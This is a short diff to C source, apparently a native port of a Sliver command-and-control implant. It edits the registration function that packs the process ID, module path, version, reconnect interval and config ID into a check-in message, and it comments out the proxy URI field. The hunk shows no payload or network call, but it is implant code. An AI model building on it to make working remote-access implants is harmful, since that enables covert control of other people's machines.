@@ -148,10 +148,10 @@ PBUFFER RegisterSliver
 	ElementList[8] = CreateVarIntElement(GetCurrentProcessId(), 9);
 	ElementList[9] = CreateBytesElement(lpModulePath, lstrlenA(lpModulePath), 10);
 	ElementList[11] = CreateBytesElement(lpVersion, lstrlenA(lpVersion), 12);
-	ElementList[12] = CreateVarIntElement(pSliverClient->uReconnectInterval, 13);
-	if (pSliverClient->HttpConfig.pProxyConfig != NULL && pSliverClient->HttpConfig.pProxyConfig->pUri != NULL) {
+	ElementList[12] = CreateVarIntElement(pConfig->dwReconnectInterval, 13);
+	/*if (pSliverClient->HttpConfig.pProxyConfig != NULL && pSliverClient->HttpConfig.pProxyConfig->pUri != NULL) {
 		ElementList[13] = CreateBytesElement(pSliverClient->HttpConfig.pProxyConfig->pUri, lstrlenA(pSliverClient->HttpConfig.pProxyConfig->pUri), 14);
-	}
+	}*/
 
 	ElementList[14] = CreateBytesElement(pConfig->szConfigID, lstrlenA(pConfig->szConfigID), 16);
 	ElementList[15] = CreateVarIntElement(pConfig->uPeerID, 17);
